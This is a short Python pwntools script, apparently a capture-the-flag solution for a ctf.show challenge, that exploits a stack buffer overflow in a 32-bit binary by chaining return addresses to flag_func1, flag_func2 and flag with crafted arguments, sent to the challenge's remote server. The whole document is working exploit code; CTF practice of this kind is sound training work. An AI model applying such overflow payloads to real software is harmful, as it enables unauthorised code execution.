from pwn import *
context(arch = "i386",os = 'linux',log_level= "debug")
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28199)
elf = ELF('./pwn')
flag_func1 = elf.sym['flag_func1']
flag_func2 = elf.sym['flag_func2']
flag = elf.sym['flag']
payload = "a" * (0x2c+4)
payload += p32(flag_func1)
payload += p32(flag_func2) + p32(flag) + p32(0xACACACAC) + p32(0xBDBDBDBD)
io.sendlineafter("flag: ", payload)
io.interactive()
